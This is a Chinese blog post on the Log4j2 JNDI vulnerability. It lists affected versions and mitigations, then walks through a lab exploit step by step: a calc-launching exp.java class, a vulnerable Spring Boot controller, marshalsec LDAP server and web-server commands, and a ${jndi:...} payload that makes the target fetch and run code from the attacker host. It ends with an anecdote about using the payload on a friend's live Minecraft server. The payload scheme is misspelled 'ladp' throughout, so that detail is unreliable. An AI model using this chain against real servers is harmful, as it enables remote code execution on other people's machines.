---
layout: post
title: Log4j2 漏洞复现及利用
categories: Security
description: 网络安全靠大家，这次漏洞利用成本低，危害大，MC 几乎全军覆没
keywords: log4j2, Minecraft, 我的世界, 网络安全
---

> 

> 网络安全靠大家，这次漏洞利用成本低，危害大，MC 几乎全军覆没！

### 一、漏洞环境

Log4j2 受影响范围：

- Apache Log4j 2.x < 2.15.0-rc2
- Log4j2 发布修复包 log4j-2.15.0-rc1.jar 存在漏洞绕过

JDK 受影响范围分几个阶段，下面按照利用方式说明：

-  受影响版本 < JDK 8u191

- 方式1：RMI Remote Object Payload
  - RMI 客户端的上下文环境允许访问远程 Codebase
  - 属性 java.rmi.server.useCodebaseOnly 的值必需为 false
  - JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是 true
- 方式2：RMI + JNDI Reference Payload
  - 属性 java.rmi.server.useCodebaseOnly 的值不受影响，true false 都可以
  - 属性 com.sun.jndi.rmi.object.trustURLCodebase 的值必须为 true
  - 属性 com.sun.jndi.cosnaming.object.trustURLCodebase 的值必须为 true
  - JDK 6u141, JDK 7u131, JDK 8u121 默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类
- 方式3：LDAP + JNDI Reference Payload
  - 属性 java.rmi.server.useCodebaseOnly 的值不受影响，true false 都可以
  - 属性 com.sun.jndi.rmi.object.trustURLCodebase 的值不受影响，true false 都可以
  - 属性 com.sun.jndi.cosnaming.object.trustURLCodebase 的值不受影响，true false 都可以
  - 属性 com.sun.jndi.ldap.object.trustURLCodebase 的值必须为 true
  - Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 默认值变为 false
- 结论：目前相对安全的版本为 JDK 8u191+ 等高版本，当然这些版本也可被绕过

### 二、解决方案

1. 紧急缓解措施
   1. 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true
   2. 修改配置 log4j2.formatMsgNoLookups=true
   3. 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true

2. 升级 log4j 版本大于等于 log4j-2.15.0-rc2.jar 版本（推荐）
3. 升级 JDK 版本大于  JDK 8u191

### 三、漏洞复现

靶机：windows10 系统 IP地址：192.168.1.2，JDK版本 JDK 8u121

攻击机：CentOS7 系统 IP地址：192.168.1.3

工具：

```java
exp.java
marshalsec-0.0.3-SNAPSHOT-all.jar
```

1. exp.java

   ```java
   import java.io.IOException;
   public class exp {
   	static{
   		try {
   			java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});
   		} catch (IOException e) {
   			e.printStackTrace();
   		}
   	}
   	public static void main(String[] args) {
   		
   	}
   }
   ```

2. marshalsec-0.0.3-SNAPSHOT-all.jar

   ```java
   1. 下载后项目后通过 Maven 编译生成 marshalsec-0.0.3-SNAPSHOT-all.jar
   https://github.com/mbechler/marshalsec.git
   2. 直接百度找现成的吧
   ```

   

#### 1. 先搭建靶机环境，使用 SpringBoot

1. pom.xml

   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <project xmlns="http://maven.apache.org/POM/4.0.0"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
       <modelVersion>4.0.0</modelVersion>
   
       <groupId>top.hkyzf</groupId>
       <artifactId>boot-helloworld</artifactId>
       <version>1.0-SNAPSHOT</version>
       <!-- 不写默认为 jar 包 -->
       <packaging>jar</packaging>
   
       <!-- 引入 Spring Boot 父依赖 -->
       <parent>
           <groupId>org.springframework.boot</groupId>
           <artifactId>spring-boot-starter-parent</artifactId>
           <version>2.4.3</version>
       </parent>
   
       <!-- 引入 Web 开发场景 -->
       <dependencies>
           <dependency>
               <groupId>org.springframework.boot</groupId>
               <artifactId>spring-boot-starter-web</artifactId>
               <exclusions><!-- 去掉springboot默认配置 -->
                   <exclusion>
                       <groupId>org.springframework.boot</groupId>
                       <artifactId>spring-boot-starter-logging</artifactId>
                   </exclusion>
               </exclusions>
           </dependency>
           <dependency> <!-- 引入log4j2依赖 -->
               <groupId>org.springframework.boot</groupId>
               <artifactId>spring-boot-starter-log4j2</artifactId>
           </dependency>
           <dependency>
               <groupId>org.projectlombok</groupId>
               <artifactId>lombok</artifactId>
           </dependency>
       </dependencies>
   
       <!-- 将项目打成 jar 包后，会将所有依赖打入包中，可直接启动部署 -->
       <build>
           <plugins>
               <plugin>
                   <groupId>org.springframework.boot</groupId>
                   <artifactId>spring-boot-maven-plugin</artifactId>
               </plugin>
           </plugins>
       </build>
   </project>
   ```

2. 主启动类

   ```java
   package top.hkyzf.boot;
   
   import org.springframework.boot.SpringApplication;
   import org.springframework.boot.autoconfigure.SpringBootApplication;
   
   /**
    * Spring Boot 主程序类，主配置类
    * @author 朱峰
    * @date 2021-8-2 10:48
    */
   @SpringBootApplication
   public class MainApplication {
       public static void main(String[] args) {
           SpringApplication.run(MainApplication.class, args);
       }
   }
   ```

3. 编写存在漏洞的方法

   ```java
   package top.hkyzf.boot.controller;
   
   import lombok.extern.slf4j.Slf4j;
   import org.springframework.web.bind.annotation.RequestMapping;
   import org.springframework.web.bind.annotation.RequestParam;
   import org.springframework.web.bind.annotation.RestController;
   
   /**
    * @author 朱峰
    * @date 2021-8-2 10:51
    */
   @Slf4j
   @RestController
   public class HelloController {
   
       @RequestMapping("/hello")
       public String hello01(@RequestParam(value = "name", required = false) String name) {
           name = "${jndi:ladp://192.168.1.3/exp}";
           log.info("名字：{}", name);
           return "你好 SpringBoot 2，我是" + name;
       }
   }
   ```

   

#### 2. 攻击机进行利用

1. 编译 exp.java 生成 exp.class（尽量使用 1.6 编译，运行环境向下兼容）

   ```shell
   javac exp.java -source 1.6 -target 1.6
   ```

2. 用 python 启动一个 web 服务，与 exp.class 在同一文件夹，方便访问

   ```shell
   # python2
   python -m SimpleHTTPServer 8080
   # pyrhon3
   python3 -m http.server 8080
   ```

3. 使用 marshalsec 在 8081 端口起一个恶意的 ldap 服务

   ```shell
   java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer  http://192.168.1.3:8080/#exp 8081
   ```

4. 直接访问 http://192.168.1.2:8080/hello?name=%24%7Bjndi%3Aladp%3A%2F%2F192.168.1.3%2Fexp%7D 即可打开靶机计算器，请求参数中的 %24%7Bjndi%3Aladp%3A%2F%2F192.168.1.3%2Fexp%7D 其实就是 ${jndi:ladp://192.168.1.3/exp} 进行 url 编码后的结果，也可以直接访问，因为程序中没有传入参数，默认的 name 参数就是 ${jndi:ladp://192.168.1.3/exp} 。

#### 3. 反弹 shell，后门+权限维持，提权

略...

### 四、MC 杂谈

1. 首先说明一下已确认 MC 1.7.x 至 1.18.x 的客户端与官方服务端均会受此漏洞影响。
2. 尝试渗透了一把基友开的 MC 服务器，登陆服务器以后，直接聊天框输入 ${jndi:ladp://xx.xx.xx.xx/exp} ，我的电脑以及基友服务器全都中招，可见如果在商业服务器上执行一下有多么可怕，所有在线玩家连带服务器直接沦陷。